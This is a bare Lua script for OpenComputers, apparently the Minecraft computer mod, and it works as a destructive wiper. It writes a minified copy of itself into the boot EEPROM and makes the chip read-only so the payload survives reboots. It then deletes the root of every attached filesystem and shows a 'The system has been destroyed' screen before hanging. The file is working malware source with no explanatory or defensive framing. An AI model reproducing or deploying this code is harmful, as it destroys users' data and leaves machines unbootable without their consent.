local component = component or require("component")
local eeprom = component.proxy(component.list("eeprom")())
local gpuTest = component.list("gpu")()

eeprom.setData("xD")
eeprom.set([=[component=component or require("component")a=component.list("gpu")()for b in component.list("filesystem")do component.invoke(b,"remove","/")end;if a then computer=computer or require("computer")c=component and component.gpu or component.proxy(a)if c.getScreen()==""then c.bind(component.list("screen")())end;if c.getScreen()~=""then d,e=c.getResolution()f,g=d/2,e/2;h={"     ◢█◣","    ◢███◣","   ◢█████◣","  ◢███████◣"," ◢█████████◣","◢███████████◣"}i={"█","█","█","","▀"}j=math.ceil(f-6)k=math.ceil(g-7)c.setBackground(0x000000)c.setForeground(0xff0000)c.fill(1,1,d,e," ")for l=1,#h do c.set(j,l+k,h[l])end;c.setBackground(0xff0000)c.setForeground(0xffffff)for l=1,#i do c.set(j+6,k+l+1,i[l])end;c.setBackground(0x000000)c.setForeground(0xffffff)c.set(math.floor(f-14),g+3,"The system has been destroyed")c.set(math.floor(f-15),g+5,"Press power button to shutdown")while true do computer.pullSignal(math.huge)end end end]=])
eeprom.makeReadonly(eeprom.getChecksum())

for filesystem in component.list("filesystem") do 
    component.invoke(filesystem, "remove", "/")
end

if gpuTest then
	local computer = computer or require("computer")
	local gpu = component and component.gpu or component.proxy(gpuTest)

	if gpu.getScreen() == "" then
	    gpu.bind((component.list("screen")()))
	end

	if gpu.getScreen() ~= "" then
	    local w, h = gpu.getResolution()
	    local wC, hC = w / 2, h / 2 

	    local triangle = {
	        "     ◢█◣",
	        "    ◢███◣",
	        "   ◢█████◣",
	        "  ◢███████◣",
	        " ◢█████████◣",
	        "◢███████████◣"
	    }

	    local warn = {
	        "█",
	        "█",
	        "█",
	        "",
	        "▀",
	    }

	    local trianglePosX = math.ceil(wC - 6)
	    local trianglePosY = math.ceil(hC - 7)

	    gpu.setBackground(0x000000)
	    gpu.setForeground(0xff0000)
	    gpu.fill(1, 1, w, h, " ")

	    for str = 1, #triangle do 
	        gpu.set(trianglePosX, str + trianglePosY, triangle[str])
	    end

	    gpu.setBackground(0xff0000)
	    gpu.setForeground(0xffffff)

	    for str = 1, #warn do 
	        gpu.set(trianglePosX + 6, trianglePosY + str + 1, warn[str])
	    end

	    gpu.setBackground(0x000000)
	    gpu.setForeground(0xffffff)

	    gpu.set(math.floor(wC - 14), hC + 3, "The system has been destroyed")
	    gpu.set(math.floor(wC - 15), hC + 5, "Press power button to shutdown")

	    while true do 
	        computer.pullSignal(math.huge)
	    end
	end
end
